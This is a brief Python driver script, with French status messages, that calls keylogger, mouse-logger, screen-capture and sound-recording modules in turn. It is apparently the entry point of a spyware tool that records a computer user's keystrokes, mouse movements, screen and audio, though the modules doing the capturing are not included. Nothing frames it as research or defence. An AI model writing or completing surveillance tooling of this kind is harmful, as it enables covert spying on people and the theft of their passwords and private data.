import keylog
import getImage
import getSound
import Mouselogger

def main():
    keylog.keylog()
    print()
    print("keylog terminé")
    print()
    getImage.getImage()
    print()
    print("capture prise")
    print()
    Mouselogger.mouseLogger()
    print()
    print("souris capturée")
    print()
    getSound.getSound()
    print()
    print("son enregistré")
    print()

if __name__ == "__main__":
    main()